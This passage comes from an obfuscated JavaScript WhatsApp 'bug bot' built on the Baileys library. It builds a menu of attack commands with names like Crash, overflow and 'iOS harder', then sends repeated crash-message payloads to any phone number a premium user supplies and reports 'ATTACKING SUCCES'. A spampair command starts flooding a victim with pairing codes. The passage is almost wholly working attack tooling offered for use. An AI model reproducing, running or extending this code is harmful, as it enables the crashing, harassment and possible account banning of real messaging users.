              'title': "͝⌁⃰𝐒͢𝐮͛𝐫𝐞͢𝐧ͦ𝐝༑",
              'id': "surend " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐇͢𝐚͛𝐫𝐝𝐒͢𝐭𝐢𝐜ͯ𝐤 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐕𝐢͢𝐫ͫ𝐗𝐬͎͢𝐙༑",
              'id': "virxsz " + target
            }]
          }, {
            'title': "⌜ 𝐗𝐘𝐗 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐇͢𝐚͛𝐫𝐝𝐒͢𝐭𝐢𝐜ͯ𝐤 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐕͢𝐮𝐥͗𝐜𝐚͗͢𝐧𝐢ͯ𝐜༑",
              'id': "vulcanic " + target
            }]
          }, {
            'title': "⌜ 𝐕𝐗 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐒͢𝐭ͦ𝐮𝐜ͯ͢𝐤 𝐋ͮ͢𝐆ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐏͢𝐪͛𝐋𝐳ͯ͢𝐗̭༑",
              'description': '⭌',
              'id': "pqlzx " + target
            }]
          }, {
            'title': "⌜ 𝐐𝐒𝐗 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐇͢𝐚͛𝐫𝐝𝐒͢𝐭𝐢𝐜ͯ𝐤 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐊͢𝐲𝐧ͯ𝐭͢𝐞𝐱ͦ༑",
              'id': "kyntex " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐇͢𝐚͛𝐫𝐝𝐒͢𝐭𝐢𝐜ͯ𝐤 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐕𝐲ͮ͢𝐧𝐭ͥ𝐚𝐱ͯ͢𝐙༑",
              'id': "vyntax " + target
            }]
          }, {
            'title': "⌜ 𝐗𝐓𝐙 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐒͢𝐲ͮ𝐬𝐭͢𝐞ͯ𝐦 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐒𝐲ͮ͢𝐬𝐭𝐞ͯ𝐦 𝐔ͦ͢𝐢༑",
              'id': "grixx " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐒͢𝐲ͮ𝐬𝐭͢𝐞ͯ𝐦 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐓𝐫͛͢𝐚𝐬ͯ𝐡 𝐔ͮ͢𝐢༑",
              'id': "xrock " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐒͢𝐲ͮ𝐬𝐭͢𝐞ͯ𝐦 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐒𝐭͢𝐮ͮ𝐜͢𝐤͛ 𝐧ͯ͢𝐨𝐭𝐢͢𝐟 𝐔ͮ͢𝐢༑",
              'id': "minwalk " + target
            }]
          }, {
            'title': "⌜ 𝐕𝚯𝐋𝚯𝐈𝐃 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐕͢𝐲͒𝐙𝐱ͯ͢𝐧༑",
              'id': "vyzxn " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐆𝐫͒͢𝐎𝐱ͯ𝐳͢𝐳ͦ𝐗༑",
              'id': "groxzzx " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐕͢𝐳ͯ𝐘𝐧͌͢𝐱༑",
              'id': "vzynx " + target
            }]
          }, {
            'title': "⌜ 𝐗𝐕𝐍 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐎͂͢𝐯𝐞̽𝐫𝐅͢𝐥𝐨͂𝐰༑",
              'id': "overflow " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐌͢𝐢͂𝐝𝐞ͦ𝐱͢𝐙̽༑",
              'id': "midexz " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐂̈́𝐫͢𝐚͒𝐬𝐡𝐅͢𝐥𝐨ͦ𝐰༑",
              'id': "crashflow " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐌͢𝐢𝐧͋𝐞𝐫͋͢𝐗༑",
              'id': "miners " + target
            }]
          }, {
            'title': "⌜ 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "𝐒𝐩𝐚𝐦𝐏𝐚𝐢𝐫",
              'id': "spampair " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐁͢𝐲𝐱̽𝐱 𝐂𝐫͢𝐚𝐬͋𝐡ཀ͜͡🐉",
            'rows': [{
              'title': "𝐓𝐞𝐦𝐩𝐁𝐚𝐧",
              'id': "tempban " + target
            }]
          }];
          let _0xf11fea = {
            'title': "⿻  ⌜ 𝐗𝐯𝐍 𝐄𝐱𝐜𝐥𝐮𝐬𝐢𝐯𝐞🐉 ⌟  ⿻",
            'sections': _0x2e4c44
          };
          let _0x33b3b0 = generateWAMessageFromContent(_0x470adc.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x470adc.sender],
                    'isForwarded': true,
                    'forwardedNewsletterMessageInfo': {
                      'newsletterJid': "1203632@newsletter",
                      'newsletterName': "𝐛𝐲𝐱𝐱 𝐡𝐚𝐫𝐝[ 𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩 ]⚡",
                      'serverMessageId': -0x1
                    },
                    'businessMessageForwardInfo': {
                      'businessOwnerJid': _0x1acf89.decodeJid(_0x1acf89.user.id)
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': ''
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'title': "☠️⃟ᝤ𝐗͢𝐕͖𝐍ͧ Э͜𝐗͢𝐂𝐋͋𝐔͖𝐒͢їѴͦ𝐄͆͡ຯ͜͡🩸͜\n \n ≫ 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : " + target + "\n \n 𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙼𝙴𝙼𝙸𝙻𝙸𝙷 𝙿𝙴𝙽𝚈𝙴𝚁𝙰𝙽𝙶𝙰𝙽 𝙱𝚄𝙶",
                    'subtitle': "𝐁𝐲𝐲𝐱𝐳",
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync("./image/xbug.jpg")
                    }, {
                      'upload': _0x1acf89.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON.stringify(_0xf11fea)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/6282291664759\",\"merchant_url\":\"https://www.google.com\"}"
                    }]
                  })
                })
              }
            }
          }, {});
          await _0x1acf89.relayMessage(_0x33b3b0.key.remoteJid, _0x33b3b0.message, {
            'messageId': _0x33b3b0.key.id
          });
        }
        break;
      case "xvnhigh":
      case "bigershard":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "pradex":
      case "combo":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x2eaf0c(target, _0x357f5a);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "trashlock":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          _0x427bb7(" ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : 𝗜𝗢𝗦 𝗛𝗔𝗥𝗗𝗘𝗥\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡");
        }
        break;
      case "xip":
      case "xios":
      case "trashios":
      case "iosampas":
      case "ipkentang":
      case "iphone":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          _0x427bb7(" ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : 𝗜𝗢𝗦 𝗛𝗔𝗥𝗗𝗘𝗥\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡");
        }
        break;
      case "grixx":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          _0x427bb7(" ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : 𝗜𝗢𝗦 𝗛𝗔𝗥𝗗𝗘𝗥\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡");
        }
        break;
      case "xrock":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x2eaf0c(target, _0x357f5a);
          _0x427bb7(" ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : 𝗜𝗢𝗦 𝗛𝗔𝗥𝗗𝗘𝗥\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡");
        }
        break;
      case "minwalk":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          _0x427bb7(" ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : 𝗜𝗢𝗦 𝗛𝗔𝗥𝗗𝗘𝗥\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡");
        }
        break;
      case "killer":
      case "vyter":
      case "xclzk":
      case "gyxel":
      case "xyntax":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          _0x427bb7(" ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : 𝗜𝗢𝗦 𝗛𝗔𝗥𝗗𝗘𝗥\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡");
        }
        break;
      case "vzxty":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x2eaf0c(target, _0x357f5a);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "funkxy":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x2eaf0c(target, _0x357f5a);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "groxzy":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x2eaf0c(target, _0x357f5a);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "vintage":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x2eaf0c(target, _0x357f5a);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "vulcanic":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "surend":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x1ad545(target, _0x313de1, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x1ad545(target, _0x313de1, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "virxsz":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "vyzxn":
      case "groxzzx":
      case "vzynx":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "pqlzx":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x57d291(target, _0x313de1, ptcp = true);
          await _0x42e795(target, ptcp = true);
          await _0x2c62e0(target, _0x57c853, ptcp = true);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "vyntax":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x2eaf0c(target, _0x357f5a);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "kyntex":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x3c7b92(target, _0x357f5a, ptcp = true);
          _0x427bb7(_0x5510bd);
        }
        break;
      case "overflow":
      case "midexz":
      case "crashflow":
      case "miners":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x2eaf0c(target, _0x357f5a);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          _0x427bb7(" ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : 𝗫𝗩𝗡 𝗛𝗔𝗥𝗗𝗘𝗥\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡");
        }
        break;
      case "testbug":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example: " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          _0x427bb7(_0x5510bd);
        }
        break;
      case "paket?":
      case "halo_bg":
      case "kenal_abyy?":
      case "riper?":
      case "lawak_ngerip":
      case "assalamualaikum":
      case "openvcs?":
      case "lawak_suki":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝘀𝗲𝗻𝗱 𝗯𝘂𝗴 ⚡");
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          await _0x111f25(target, _0x357f5a, cct = false, ptcp = false);
          _0x427bb7(_0x3dab81);
        }
        break;
      case "spampair":
        {
          if (!_0x3cc2ac) {
            return _0x427bb7(mess.owner);
          }
          if (!q) {
            return _0x427bb7("*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx\n\n𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🎭");
          }
          let [_0xde6a60, _0x57704a = "200"] = q.split('|');
          await _0x427bb7("</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️");
          let _0x4b42bd = _0xde6a60.replace(/[^0-9]/g, '').trim();
          let {
            default: _0x51d93b,
            useMultiFileAuthState: _0xa93fa0,
            fetchLatestBaileysVersion: _0xc7cad2
          } = require("@whiskeysockets/baileys@^6.4.0");
          let {
            state: _0xdc8d2
          } = await _0xa93fa0("ThebyxxWangsaff");
          let {
